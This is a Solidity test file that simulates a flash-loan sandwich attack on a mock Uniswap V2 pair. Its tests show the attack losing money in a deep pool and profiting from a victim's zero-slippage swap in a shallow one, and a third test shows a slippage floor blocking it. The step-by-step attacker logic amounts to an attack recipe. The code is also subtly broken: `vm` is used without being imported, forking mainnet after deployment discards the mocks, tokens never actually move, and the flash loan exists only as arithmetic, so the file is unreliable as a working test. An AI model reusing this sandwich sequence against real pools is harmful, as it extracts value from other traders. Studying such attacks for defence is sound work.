// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract MockUniswapV2Pair {
    uint112 public reserveToken;
    uint112 public reserveETH;

    constructor(uint112 _reserveToken, uint112 _reserveETH) payable {
        reserveToken = _reserveToken;
        reserveETH = _reserveETH;
    }

    receive() external payable {}

    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) public pure returns (uint256) {
        require(amountIn > 0, "INSUFFICIENT_INPUT_AMOUNT");
        require(reserveIn > 0 && reserveOut > 0, "INSUFFICIENT_LIQUIDITY");
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = (reserveIn * 1000) + amountInWithFee;
        return numerator / denominator;
    }

    function swapETHForTokens() external payable returns (uint256 amountOut) {
        amountOut = getAmountOut(msg.value, reserveETH, reserveToken);
        require(amountOut < reserveToken, "EXCEEDS_RESERVES");
        reserveETH += uint112(msg.value);
        reserveToken -= uint112(amountOut);
        return amountOut;
    }

    function swapTokensForETH(uint256 tokenAmountIn, uint256 minETHOut) external returns (uint256 ethOut) {
        ethOut = getAmountOut(tokenAmountIn, reserveToken, reserveETH);
        require(ethOut >= minETHOut, "SLIPPAGE_EXCEEDED");
        require(ethOut < reserveETH, "EXCEEDS_ETH_RESERVES");
        reserveToken += uint112(tokenAmountIn);
        reserveETH -= uint112(ethOut);
        payable(msg.sender).transfer(ethOut);
        return ethOut;
    }
}

contract FlashLoanSlippageSimulationTest {
    MockUniswapV2Pair public highLiqPair;
    MockUniswapV2Pair public lowLiqPair;

    receive() external payable {}

    function setUp() public {
        // Deploy MockUniswapV2Pair contracts to BASE Mainnet
        highLiqPair = new MockUniswapV2Pair{value: 200 ether}(20_000_000 ether, 200 ether);
        lowLiqPair = new MockUniswapV2Pair{value: 1.30 ether}(130_000 ether, 1.30 ether);

        // Set up the environment to connect to BASE Mainnet
        vm.createSelectFork(vm.envString("BASE_RPC_URL"));
    }

    // SCENARIO 1: High Liquidity Pool (200 ETH) -> 0.6% DEX Fee Friction Prevents Extraction
    function test_01_HighLiquidity_ProtectedByFeeFriction() public {
        uint256 victimTokens = 10_000 ether; // ~0.10 ETH value (0.05% of 200 ETH pool)
        uint256 normalEth = highLiqPair.getAmountOut(victimTokens, 20_000_000 ether, 200 ether);

        // Attacker attempts token-dump frontrun (30,000 tokens)
        uint256 attackerFrontRunTokens = 30_000 ether;
        uint256 ethFromFrontRun = highLiqPair.swapTokensForETH(attackerFrontRunTokens, 0);

        // Victim executes swap with amountOutMin = 0
        uint256 victimEth = highLiqPair.swapTokensForETH(victimTokens, 0);

        // Attacker back-runs by buying tokens back
        uint256 tokensBoughtBack = highLiqPair.swapETHForTokens{value: ethFromFrontRun}();

        // Due to 0.6% round-trip fee friction on the huge 200 ETH pool,
        // the attacker recovers FEWER tokens than they started with (NET LOSS)!
        require(tokensBoughtBack < attackerFrontRunTokens, "High liquidity must cause net loss for attacker");
        
        // Victim lost negligible value (< 0.5%)
        uint256 lossPercent = ((normalEth - victimEth) * 100) / normalEth;
        require(lossPercent < 1, "Victim loss should be under 1% in high liquidity pool");
    }

    // SCENARIO 2: Low Liquidity Pool (1.30 ETH) -> Profitable Flash Loan Extraction
    function test_02_LowLiquidity_ProfitableFlashLoanExtraction() public {
        uint256 victimTokens = 10_000 ether; // ~0.10 ETH value (7.68% of 1.30 ETH pool)
        uint256 normalEth = lowLiqPair.getAmountOut(victimTokens, 130_000 ether, 1.30 ether);

        // 1. Attacker borrows 30,000 tokens via Flash Loan (fee = 0.05% = 15 tokens)
        uint256 borrowedTokens = 30_000 ether;
        uint256 flashLoanFee = (borrowedTokens * 5) / 10000; // 15 tokens

        // 2. Front-Run: Attacker sells 30,000 tokens into the 1.30 ETH pool -> dumping token price
        uint256 ethFromFrontRun = lowLiqPair.swapTokensForETH(borrowedTokens, 0);

        // 3. Victim executes swap with amountOutMin = 0 (absorbs severe price depression)
        uint256 victimEth = lowLiqPair.swapTokensForETH(victimTokens, 0);

        // 4. Back-Run: Attacker buys tokens back using the front-run ETH
        uint256 tokensBoughtBack = lowLiqPair.swapETHForTokens{value: ethFromFrontRun}();

        // 5. Repay Flash Loan (30,000 tokens + 15 tokens fee)
        uint256 totalDebt = borrowedTokens + flashLoanFee;
        require(tokensBoughtBack > totalDebt, "Attacker should extract net profit in low liquidity");
        
        uint256 netProfitTokens = tokensBoughtBack - totalDebt;
        uint256 victimLossPercent = ((normalEth - victimEth) * 100) / normalEth;

        // Victim suffered > 20% loss
        require(victimLossPercent >= 20, "Victim suffered massive slippage loss");
        // Attacker walked away with surplus tokens with zero initial capital!
        require(netProfitTokens > 0, "Attacker extracted net profit via Flash Loan");
    }

    // SCENARIO 3: Defensive Remediation -> TWAP Floor Protects Against Sandwich
    function test_03_DefensiveMitigation_TwapFloorBlocksSandwich() public {
        uint256 victimTokens = 10_000 ether;
        uint256 normalEth = lowLiqPair.getAmountOut(victimTokens, 130_000 ether, 1.30 ether);

        // Enforce max 2% slippage tolerance based on TWAP / Oracle price
        uint256 minEthFloor = (normalEth * 98) / 100;

        // Attacker attempts front-run
        lowLiqPair.swapTokensForETH(30_000 ether, 0);

        // Victim executes swap with minEthFloor:
        try lowLiqPair.swapTokensForETH(victimTokens, minEthFloor) {
            revert("Protected swap should have reverted due to slippage violation");
        } catch Error(string memory reason) {
            // Slippage check prevented execution at manipulated price!
            bytes memory reasonBytes = bytes(reason);
            require(reasonBytes.length > 0, "Revert reason captured");
        }
    }
}
